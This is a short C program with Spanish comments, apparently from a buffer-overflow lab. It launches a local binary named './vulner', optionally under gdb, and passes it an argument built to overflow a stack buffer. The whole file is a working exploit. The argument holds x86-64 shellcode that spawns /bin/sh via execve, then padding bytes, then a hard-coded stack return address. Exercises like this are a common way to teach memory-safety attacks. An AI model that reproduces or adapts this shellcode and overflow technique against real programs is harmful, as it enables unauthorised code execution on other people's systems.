#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *programVul = "./vulner";  // Programa a ejecutar
    int debugueando = 1;// a 1 para ejecutar con gdb
    char *debugguer= "gdb";  // El debuguer que quieras usar
        unsigned char shellcode[] =
        //PRIMERO LA SHELL ENTERA:
    "\x48\x31\xD2" //xor rdx
    "\x48\x31\xc9"//xor rcx, rcx
        "\x48\xf7\xe1"//mul rcx
        "\x04\x3b"//add al, 0x3b
        "\x48\xbb"//mov rbx, <value>
        "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53"
    "\x54\x5f\x52\x57\x54\x5e"
        "\x0f\x05"//syscall//syscall
        //DESPUES EL RELLENO
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa"
    "\xac"
        //PARA TERMINAR LA DIRECCION A LA QUE SALTAR:
    "\x40\xd9\xff\xff\xff\x7f";// direccion de memoria a la que saltar


    char *args1[] = { programVul, shellcode, NULL };  // Argumentos a pasar sin debuguear
    char *args2[] = { debugguer,"--args",programVul, shellcode, NULL };  // Argumentos a pasar debugueando
    printf("Ejecutando %s con argumentos ...\n", programVul);
        if(debugueando){
    execvp(debugguer, args2);  // Ejecuta el programa con argumentos
        }else{

    execvp(programVul, args1);  // Ejecuta el programa con argumentos

        }



    // Si execvp falla, mostramos un error
    return 1;
}
